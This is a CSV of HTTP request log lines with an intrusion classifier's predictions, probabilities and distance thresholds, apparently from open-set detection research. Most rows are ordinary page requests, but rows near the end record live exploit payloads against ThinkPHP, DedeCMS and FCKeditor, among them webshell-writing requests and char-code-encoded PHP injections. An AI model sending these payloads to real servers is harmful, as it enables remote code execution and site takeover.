row_idx,text,pred_label,max_prob,dist_to_pred_centroid,prob_threshold,distance_threshold,reliable_count,delta,k1,k2,is_unknown,final_label,reject_reason
246,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
247,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887,5.963249206542969,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
248,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789,6.137630462646484,0.5398888796567917,5.560724353790283,0,0.15801864862442017,50,5,1,unknown,low_density
249,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665,4.237602233886719,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
250,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685,5.096368789672852,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
251,METHOD=GET PATH=/self.logs/access.log.2019-01-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45979568362236023,5.306453227996826,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
252,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
253,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
254,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881,5.0533552169799805,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
255,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.4974004030227661,5.241054534912109,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
256,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.4688447117805481,5.5640950202941895,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
257,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.4933105707168579,5.292185306549072,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
258,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.4917145073413849,5.304859638214111,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
259,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.5004051923751831,5.329277038574219,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
260,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.4963632822036743,5.295013904571533,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
261,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634,5.328363418579102,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
262,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.48196008801460266,5.338896751403809,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
263,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.480240136384964,5.459165096282959,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
264,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.48653101921081543,5.347537994384766,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
265,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
266,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915,5.710719585418701,0.5398888796567917,5.560724353790283,3,0.15801864862442017,50,5,1,unknown,low_density
267,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465,5.904941082000732,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
268,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025,5.877259254455566,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
269,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403,5.542276382446289,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
270,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919,5.853207111358643,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
271,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744,5.845867156982422,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
272,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465,5.851503849029541,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
273,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4384268522262573,5.539216041564941,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
274,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4483668804168701,5.485589504241943,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
275,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4019940197467804,5.883749961853027,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
276,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44058606028556824,5.492505073547363,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
277,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
278,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4070121645927429,5.999605655670166,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
279,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40792790055274963,5.9929914474487305,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
280,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42459577322006226,5.643716335296631,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
281,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40308234095573425,5.975087642669678,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
282,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.39524802565574646,5.994900226593018,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
283,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3962686061859131,5.984725475311279,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
284,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4135914444923401,5.670411109924316,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
285,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.393920361995697,5.961259841918945,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
286,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43751388788223267,5.641131401062012,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
287,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4450225234031677,5.599212646484375,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
288,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3942822217941284,6.005496025085449,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
289,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4375974237918854,5.593822479248047,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
290,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4225592315196991,5.670152187347412,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
291,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4275737702846527,5.640439987182617,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
292,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38818758726119995,5.992548942565918,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
293,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42012807726860046,5.638028144836426,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
294,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
295,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353,5.759641170501709,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
296,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681,4.828179359436035,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
297,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067,4.91908597946167,0.5398888796567917,4.467410373687743,2,0.15801864862442017,50,5,1,unknown,low_density
298,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986,5.053356170654297,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
299,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
300,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
301,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
302,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
303,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881,5.0533552169799805,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
304,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
305,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
306,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465,5.851503849029541,0.5398888796567917,5.560724353790283,2,0.15801864862442017,50,5,1,unknown,low_density
307,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
308,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
309,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
310,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
311,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846,6.245889186859131,0.5398888796567917,5.560724353790283,1,0.15801864862442017,50,5,1,unknown,low_density
312,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887,5.963249206542969,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
313,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665,4.237602233886719,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
314,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789,6.137630462646484,0.5398888796567917,5.560724353790283,0,0.15801864862442017,50,5,1,unknown,low_density
315,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685,5.096368789672852,0.5398888796567917,4.467410373687743,1,0.15801864862442017,50,5,1,unknown,low_density
316,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=%2F PROTOCOL=HTTP/1.1,command_exec,0.6429962515830994,2.293095827102661,0.75,2.8727237254381177,1,0.15801864862442017,50,5,1,unknown,low_density
317,METHOD=GET PATH=/index.php QUERY=m=member&c=index&a=register&siteid=1 PROTOCOL=HTTP/1.1,command_exec,0.42297330498695374,3.424921751022339,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
318,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744,4.253142833709717,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
319,METHOD=GET PATH=/plus/moon.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44791358709335327,3.7508668899536133,0.75,2.8727237254381177,1,0.15801864862442017,50,5,1,unknown,low_density
320,METHOD=POST PATH=/plus/90sec.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.42047426104545593,4.05720329284668,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
321,METHOD=POST PATH=/utility/convert/index.php QUERY=a=config&source=d7.2_x2.0 PROTOCOL=HTTP/1.1,command_exec,0.5237575173377991,2.8266468048095703,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
322,METHOD=POST PATH=/utility/convert/data/config.inc.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.547547459602356,2.890540838241577,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
323,METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// PROTOCOL=HTTP/1.1,command_exec,0.8581370711326599,1.9982426166534424,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
324,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec,0.8373600840568542,1.8265321254730225,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
325,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623397171497345,2.3780109882354736,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
326,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785,2.688668727874756,0.75,2.8727237254381177,1,0.15801864862442017,50,5,1,unknown,low_density
327,METHOD=POST PATH=/fdgq.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.45104455947875977,4.584648132324219,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
328,"METHOD=GET PATH=/ QUERY=s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E PROTOCOL=HTTP/1.1",command_exec,0.7207354307174683,2.2233221530914307,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
329,METHOD=POST PATH=/ppeeu.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45686331391334534,6.593556880950928,0.5398888796567917,5.560724353790283,0,0.15801864862442017,50,5,1,unknown,low_density
330,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785,2.688668727874756,0.75,2.8727237254381177,1,0.15801864862442017,50,5,1,unknown,low_density
331,METHOD=POST PATH=/ysyqq.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41941767930984497,6.612789630889893,0.5398888796567917,5.560724353790283,0,0.15801864862442017,50,5,1,unknown,low_density
332,"METHOD=GET PATH=/ QUERY=s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ PROTOCOL=HTTP/1.1",command_exec,0.6881241798400879,2.465670585632324,0.75,2.8727237254381177,2,0.15801864862442017,50,5,1,unknown,low_density
333,METHOD=POST PATH=/txual.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44853901863098145,4.246179103851318,0.75,2.8727237254381177,0,0.15801864862442017,50,5,1,unknown,low_density
334,METHOD=GET PATH=/plus/mytag_js.php QUERY=dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 PROTOCOL=HTTP/1.1,benign,0.48952075839042664,6.587284088134766,0.5398888796567917,4.467410373687743,0,0.15801864862442017,50,5,1,unknown,low_density
335,METHOD=GET PATH=/plus/download.php QUERY=open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar PROTOCOL=HTTP/1.1,benign,0.4624825716018677,6.89285135269165,0.5398888796567917,4.467410373687743,0,0.15801864862442017,50,5,1,unknown,low_density
